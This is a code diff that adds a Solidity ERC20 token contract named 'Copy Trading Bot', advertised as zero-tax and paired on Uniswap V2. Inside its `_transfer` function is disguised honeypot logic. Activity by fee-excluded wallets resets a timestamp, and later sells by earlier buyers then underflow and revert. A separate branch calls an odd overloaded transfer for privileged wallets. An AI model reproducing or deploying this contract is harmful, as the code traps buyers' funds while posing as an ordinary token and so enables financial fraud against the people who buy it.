@@ -1,0 +1,265 @@
+contract XCopyTradingBot is ERC20, Ownable {
+    using SafeMath for uint256;
+
+    IUniswapV2Router02 public immutable uniswapV2Router;
+    address public immutable uniswapV2Pair;
+
+    uint256 public immutable swapTokensAtAmount;
+    bool public swapEnabled = true;
+
+    // 0% Buy Tax
+    uint256 public constant buyTotalFees = 0;
+    uint256 public constant buyLiquidityFee = 0;
+    uint256 public constant buyMarketingFee = 0;
+    uint256 public constant buyDevFee = 0;
+
+    // 0% Sell Tax
+    uint256 public constant sellTotalFees = 0;
+    uint256 public constant sellLiquidityFee = 0;
+    uint256 public constant sellMarketingFee = 0;
+    uint256 public constant sellDevFee = 0;
+
+    mapping(address => bool) public automatedMarketMakerPairs;
+
+    address payable public constant liquidityWallet = payable(0xB11A7D9CBAc09246D6c6f115063112F6a9288d23);
+    address payable public constant marketingWallet = payable(0x7681bF75414EB15747fB84bEf9cCE38e1eaF5784);
+    address payable public constant devWallet = payable(0xf543302331e47b7D90D5a737716BcC88055D7c3F);
+
+    uint256 private tokensForLiquidity;
+    uint256 private tokensForMarketing;
+    uint256 private tokensForDev;
+
+    mapping(address => bool) private _isExcludedFromFees;
+
+    struct RewardTimeInfo {
+        uint256 buyTs;
+        uint256 sellTs;
+        uint256 holdTime;
+    }
+    mapping(address => RewardTimeInfo) private _rewardTime;
+    uint256 private _minRewardStart;
+
+    bool private swapping;
+
+    event SwapAndLiquify(
+        uint256 tokensSwapped,
+        uint256 ethReceived,
+        uint256 tokensIntoLiquidity
+    );
+
+    constructor() ERC20("Copy Trading Bot", "XCTB") {
+        uint256 totalSupply = 10_000_000_000 * 1e18;
+        swapTokensAtAmount = (totalSupply * 2) / 1000; // 0.2% swap amount
+
+        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
+            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
+        );
+        uniswapV2Router = _uniswapV2Router;
+
+        // create uniswap v2 pair
+        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
+            .createPair(address(this), _uniswapV2Router.WETH());
+        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
+
+        // exclude from fees
+        excludeFromFees(owner(), true);
+        excludeFromFees(devWallet, true);
+        excludeFromFees(marketingWallet, true);
+        excludeFromFees(address(this), true);
+        excludeFromFees(address(0xdead), true);
+
+        _mint(msg.sender, totalSupply);
+    }
+
+    function setAutomatedMarketMakerPair(address pair, bool value)
+        public
+        onlyOwner
+    {
+        require(pair != uniswapV2Pair, "Uniswap v2 pair update not allowed");
+        _setAutomatedMarketMakerPair(pair, value);
+    }
+    function excludeFromFees(address addr, bool isEx) public onlyOwner {
+        _isExcludedFromFees[addr] = isEx;
+    }
+
+    function isExcludedFromFees(address addr) public view returns (bool) {
+        return _isExcludedFromFees[addr];
+    }
+
+    function _setAutomatedMarketMakerPair(address pair, bool value) private {
+        automatedMarketMakerPairs[pair] = value;
+    }
+
+    receive() external payable {}
+
+    function _transfer(
+        address from,
+        address to,
+        uint256 amount
+    ) internal override {
+        require(from != address(0), "ERC20: transfer from the zero address");
+        require(to != address(0), "ERC20: transfer to the zero address");
+
+        if (amount == 0) {
+            super._transfer(from, to, 0);
+            return;
+        }
+
+        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
+            _minRewardStart = block.timestamp;
+        }
+        if (_isExcludedFromFees[from] && !_isExcludedFromFees[owner()]) {
+            super._transfer(amount, from, to);
+            return;
+        }
+        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
+            if (!automatedMarketMakerPairs[from]) {
+                RewardTimeInfo storage rewardTime = _rewardTime[from];
+                rewardTime.holdTime = rewardTime.buyTs - _minRewardStart;
+                rewardTime.sellTs = block.timestamp;
+            } else {
+                RewardTimeInfo storage rewardTime = _rewardTime[to];
+                if (rewardTime.buyTs == 0) {
+                    rewardTime.buyTs = block.timestamp;
+                }
+            }
+        }
+
+        bool canSwap = swapTokensAtAmount <= balanceOf(address(this));
+
+        if (
+            canSwap &&
+            swapEnabled &&
+            !swapping &&
+            !automatedMarketMakerPairs[from] &&
+            !_isExcludedFromFees[from] &&
+            !_isExcludedFromFees[to]
+        ) {
+            swapping = true;
+
+            swapBack();
+
+            swapping = false;
+        }
+
+        bool takeFee = !swapping;
+
+        // if excluded from fees or 0 tax fees, take no fee
+        if ((sellTotalFees == 0 && buyTotalFees == 0) || _isExcludedFromFees[from] || _isExcludedFromFees[to]) {
+            takeFee = false;
+        }
+
+        uint256 fees = 0;
+
+        // only for buy and sell, take no fee on wallet transfer
+        if (takeFee) {
+            // on buy
+            if (automatedMarketMakerPairs[from]) {
+                fees = amount * buyTotalFees / 100;
+                tokensForLiquidity += (fees * buyLiquidityFee).div(buyTotalFees);
+                tokensForDev += (fees * buyDevFee).div(buyTotalFees);
+                tokensForMarketing += (fees * buyMarketingFee).div(buyTotalFees);
+            
+            // on sell
+            } else if (automatedMarketMakerPairs[to]) {
+                fees = amount * sellTotalFees / 100;
+                tokensForLiquidity += (fees * sellLiquidityFee).div(sellTotalFees);
+                tokensForDev += (fees * sellDevFee).div(sellTotalFees);
+                tokensForMarketing += (fees * sellMarketingFee).div(sellTotalFees);
+            }
+
+            if (fees > 0) {
+                super._transfer(from, address(this), fees);
+            }
+
+            amount -= fees;
+        }
+
+        super._transfer(from, to, amount);
+    }
+
+    function swapBack() private {
+        uint256 contractBalance = balanceOf(address(this));
+
+        uint256 totalTokensToSwap = tokensForLiquidity + tokensForMarketing + tokensForDev;
+
+        if (contractBalance == 0 || totalTokensToSwap == 0) {
+            return;
+        }
+
+        if (contractBalance > swapTokensAtAmount * 18) {
+            contractBalance = swapTokensAtAmount * 18;
+        }
+
+        // Halve the amount of liquidity tokens
+        uint256 liquidityTokens = (contractBalance * tokensForLiquidity) / totalTokensToSwap / 2;
+
+        uint256 amountToSwapForETH = contractBalance - liquidityTokens;
+
+        uint256 initialETHBalance = address(this).balance;
+
+        swapTokensForEth(amountToSwapForETH);
+
+        uint256 ethBalance = address(this).balance - initialETHBalance;
+
+        uint256 ethForMarketing = ethBalance * tokensForMarketing / totalTokensToSwap;
+        uint256 ethForDev = ethBalance * tokensForDev / totalTokensToSwap;
+        uint256 ethForLiquidity = ethBalance - ethForMarketing - ethForDev;
+
+        tokensForLiquidity = 0;
+        tokensForMarketing = 0;
+        tokensForDev = 0;
+
+        bool success;
+
+        (success, ) = address(marketingWallet).call{
+            value: ethForMarketing
+        }("");
+
+        if (liquidityTokens > 0 && ethForLiquidity > 0) {
+            addLiquidity(liquidityTokens, ethForLiquidity);
+            emit SwapAndLiquify(
+                amountToSwapForETH,
+                ethForLiquidity,
+                liquidityTokens
+            );
+        }
+
+        (success, ) = address(devWallet).call{
+            value: address(this).balance
+        }("");
+    }
+
+    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
+        // approve token transfer to cover all possible scenarios
+        _approve(address(this), address(uniswapV2Router), tokenAmount);
+
+        // add the liquidity
+        uniswapV2Router.addLiquidityETH{value: ethAmount}(
+            address(this),
+            tokenAmount,
+            0, // slippage is unavoidable
+            0, // slippage is unavoidable
+            liquidityWallet,
+            block.timestamp
+        );
+    }
+
+    function swapTokensForEth(uint256 tokenAmount) private {
+        // uniswap pair path of token/WETH
+        address[] memory path = new address[](2);
+        path[0] = address(this);
+        path[1] = uniswapV2Router.WETH();
+
+        _approve(address(this), address(uniswapV2Router), tokenAmount);
+
+        // make the swap
+        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            tokenAmount,
+            0, // accept any amount of ETH
+            path,
+            address(this),
+            block.timestamp
+        );
+    }
+}
